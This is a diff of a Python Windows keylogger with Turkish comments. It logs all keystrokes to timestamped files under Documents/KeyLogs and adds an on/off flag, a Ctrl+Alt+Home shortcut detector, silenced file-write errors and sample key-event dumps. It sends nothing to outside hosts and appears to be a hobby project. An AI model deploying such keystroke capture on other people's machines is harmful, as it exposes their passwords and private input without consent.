@@ -33,10 +33,12 @@ LVL_NONE = 0  # Çıktı yok
 #            EVRENSEL DEĞİŞKENLER           
 #############################################
 
+LOG_ACTIVE = False
 LOG_DIR = os.path.join(os.environ['userprofile'], "Documents", "KeyLogs")
 LOG_FILE = datetime.now().strftime('%d-%b-%Y-%H-%M-%S') + ".log"
-LOG_LVL = LVL_NONE
+LOG_LVL = LVL_INFO
 KEY_LIMIT = 1
+SHORTCUT = (162, 164, 36) # CTRL + ALT + HOME
 
 #############################################
 #                FONKSİYONLAR               
@@ -68,13 +70,12 @@ def printKeyData(keyData):
         print("\n".join(keyData))
 
 
-
-    """ char = chr(event.Ascii)
-    logging.log(10, char) """
-
 def logDirectly(keyData):
-    CONTEXT_FILE.write("\n".join(keyData))
-    CONTEXT_FILE.flush()
+    try:
+        CONTEXT_FILE.write("\n".join(keyData))
+        CONTEXT_FILE.flush()
+    except:
+        pass
 
 
 def logOnReach(keyData):
@@ -83,14 +84,65 @@ def logOnReach(keyData):
         for keyData in list_keyData:
             logDirectly(list_line)
 
+
+    if not LOG_ACTIVE:
+        return
+
     global list_keyData
     list_keyData.append(keyData)
 
     if len(list_keyData) > KEY_LIMIT:
         logListLines(list_keyData)
 
+def resetShortCut():
+    global list_press
+    list_press = [False, False, False]
+
+def refreshShortcutPress():
+    global isShortcut
+    for press in list_press:
+        if not press:
+            isShortcut = False
+            return
+
+    isShortcut = True
+
+def onShortCutPressed():
+    if LOG_LVL >= LVL_INFO:
+        print("Kısayola basıldı")
+
+# TODO: Keydown ile halledebilirsim
+#       Her keye basıldığında -> True, çekildiğinde -> False
+#       Hepsi true ise kısayol aktif demektir
+#       Daha sağlıklı (ama yorucu 😢)
+def handleShortcutPressed(event):
+    if event.KeyID == SHORTCUT[len(SHORTCUT) - 1]:
+        refreshShortcutPress()
+        if isShortcut:
+            onShortCutPressed()
+            return
+    elif isShortcut:
+        resetShortCut()
+
+    global list_press
+    for i in range(len(SHORTCUT)):
+        if not list_press[i]:
+            if SHORTCUT[i] == event.KeyID:
+                list_press[i] = True
+                break
+            else:
+                resetShortCut()
+                break
+
+    refreshShortcutPress()
+    if isShortcut:
+        onShortCutPressed()
+        resetShortCut()
+
 
 def OnKeyboardEvent(event):
+    handleShortcutPressed(event)
+
     keyData = parseData(event)
     printKeyData(keyData)
 
@@ -102,13 +154,19 @@ def OnKeyboardEvent(event):
     return True
 
 def openFile():
+    if not LOG_ACTIVE:
+        return
+
     if not os.path.exists(LOG_DIR):
         os.makedirs(LOG_DIR)
 
     return open(os.path.join(LOG_DIR, LOG_FILE), "a+", encoding="utf-8")
 
 def onexit():
-    CONTEXT_FILE.close()
+    try:
+        CONTEXT_FILE.close()
+    except:
+        pass
 
 def pumpMessage():
     pygame.init()
@@ -119,8 +177,57 @@ def pumpMessage():
 #           PROGRAMIN ÇALIŞMA YERI
 ############################################# 
 
+""" 
+UTC Time:    2019-06-26 21:29:34.847890
+Boot Time:   244593
+MessageName: key down
+Message:     256
+Window:      459330
+WindowName:  KeyLogs
+Ascii:       0
+Key:         Lcontrol
+KeyID:       162
+ScanCode:    29
+Extended:    0
+Injected:    0
+Alt:         0
+Transition:  0
+
+UTC Time:    2019-06-26 21:29:34.913715
+Boot Time:   244656
+MessageName: key down
+Message:     256
+Window:      459330
+WindowName:  KeyLogs
+Ascii:       0
+Key:         Lmenu
+KeyID:       164
+ScanCode:    56
+Extended:    0
+Injected:    0
+Alt:         0
+Transition:  0
+
+UTC Time:    2019-06-26 21:29:35.060320
+Boot Time:   244796
+MessageName: key down
+Message:     256
+Window:      459330
+WindowName:  KeyLogs
+Ascii:       0
+Key:         Home
+KeyID:       36
+ScanCode:    71
+Extended:    1
+Injected:    0
+Alt:         0
+Transition:  0 
+"""
+
 CONTEXT_FILE = openFile()
 list_keyData = []
+list_press = [False, False, False]
+isShortcut = False
 
 atexit.register(onexit) # TODO: Bunu nasıl aktif kılarım bilmiyorum
 
